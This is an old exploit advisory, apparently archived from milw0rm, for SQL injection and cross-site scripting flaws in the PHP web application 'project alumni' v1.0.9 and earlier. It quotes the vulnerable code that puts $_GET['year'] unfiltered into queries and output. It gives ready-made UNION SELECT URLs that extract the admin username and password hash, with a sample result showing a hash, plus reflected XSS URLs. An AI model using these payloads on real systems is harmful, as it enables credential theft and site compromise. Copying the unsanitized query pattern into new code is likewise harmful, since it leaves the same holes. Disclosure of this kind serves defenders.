<html><head><title>project alumni <= 1.0.9 Remote XSS / SQL Injection Vulnerability</title></head><pre>project-alumni sql injection &amp; xss
author : tomplixsee 
tomplixsee@yahoo.co.id

-------------------------------------------------------------------------------------------------------------
affected software version	: project alumni v1.0.9, v1.0.8, or lower??
download			: https://sourceforge.net/projects/project-alumni/


vulnerability
=============

1.sql injection
++++++++++++++++
condition: magic_quotes_gpc = off

vulnerable code on view.page.inc.php: 
$result = dbQuery(&quot;SELECT * FROM `&quot;.getConfigVal(&quot;sqlTablePrefix&quot;,2).&quot;_users` WHERE `alumniYear` = '&quot;.$_GET['year'].&quot;'&quot;); 

reason: bad filtering
exploit:
http://victim/path/index.php?act=view&amp;year=2003' union select 1,1,1,alumniUserName,1,alumniPassword,1,1,1,1,1,1,1,1,1,1,1,1,1 from alumni_users where ID='1 

result example:
+---------------------------------------------------------------------------------------------------+------------------------------------------+
 |	Name   					 	|	Email		 |				 
+---------------------------------------------------------------------------------------------------+------------------------------------------+
 |	tomplixsee (1) f25a2fc72690b780b2a14e140ef6a9e0	|	Not Available              |
+------------------------------------------------------------------------------------------------ --+------------------------------------------+
tomplixsee is admin's username and f25a2fc72690b780b2a14e140ef6a9e0 is md5 encrypt from admin's password.


vulnerable code on news.page.inc.php
$result = dbQuery(&quot;SELECT * FROM `&quot;.getConfigVal(&quot;sqlTablePrefix&quot;,2).&quot;_class_news` WHERE `year` = '&quot;.$_GET['year'].&quot;'&quot;);

reason: bad filtering
exploit:
http://victim/path/index.php?act=news&amp;year=2003' union select 1,2,3,4,5,6,alumniPassword,8,9 from alumni_users where ID='1

2.xss
++++++
vulnerable code:

________________________________________________________________________________
#/xml/index.php									#
#										#
#	&lt;?php 									#
#	if(isset($_GET[&quot;year&quot;])){						#
#		$year = $_GET[&quot;year&quot;];						#
#	}									#
#	if($year=='FRND')							#
#		$yearText = &quot;Friends of &quot;.getConfigVal(&quot;schoolAbbr&quot;,2).&quot; Alumni&quot;;		#
#	else									#
#		$yearText = &quot;Class of $year&quot;;					#
#	?&gt;									#
#	.....									#
#	&lt;?php echo&quot;$yearText&quot;;?&gt;						#
#	.....									#
#										#
#exploit:									#
#http://victim/path/xml/index.php?year=&lt;xss&gt;					#
#_______________________________________________________________________________#
# view.page.inc.php								#
#										#
#	&lt;?php if(!$_GET['year']) { ?&gt;						#
#	....									#
#	&lt;?php } else if ($_GET['year'] &lt; getConfigVal(&quot;alumniStartYear&quot;,2)) { ?&gt;#
#	....									#
#	&lt;?php } else { ?&gt;							#
#	&lt;h2&gt;Alumni for the Graduating Year of &lt;?php echo $_GET['year'] ?&gt;&lt;/h2&gt;	#
#										#
#exploit									#
#http://victim/path/index.php?act=view&amp;year=&lt;xss&gt;				#
#_______________________________________________________________________________#


salam untuk:
anak-anak jaringan sukabirus, teman-teman di stt telkom, komunitas jasakom, 
sibalbal, crutz_ao, bidulux, akillers 179...........

# milw0rm.com [2007-11-24]</pre></html>